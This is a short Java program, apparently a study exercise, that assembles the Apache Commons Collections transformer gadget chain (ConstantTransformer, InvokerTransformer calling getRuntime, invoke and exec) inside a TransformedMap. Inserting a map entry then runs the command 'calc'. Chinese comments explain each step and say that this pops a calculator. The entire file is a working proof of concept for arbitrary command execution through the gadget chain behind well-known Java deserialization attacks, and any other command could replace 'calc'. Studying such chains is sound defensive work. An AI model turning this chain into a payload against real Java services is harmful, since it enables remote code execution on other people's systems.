package com.zxd.commoncollection;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class UseTransformedMap {

    public static void main(String[] args) {
        // 使用Class类来执行
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                // 拿到getRuntime方法
                new InvokerTransformer("getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new String[]{"getRuntime",null}),
                // 获取runtime实例
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                //正常使用
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map map = new HashMap();
        map.put("key1", "value1");
        Map myMap = TransformedMap.decorate(map,null,chainedTransformer);
//        Map myMap = TransformedMap.decorate(map,chainedTransformer,null);

        // 这一步会弹出计算器
        myMap.put("key2", "value2");




    }

}
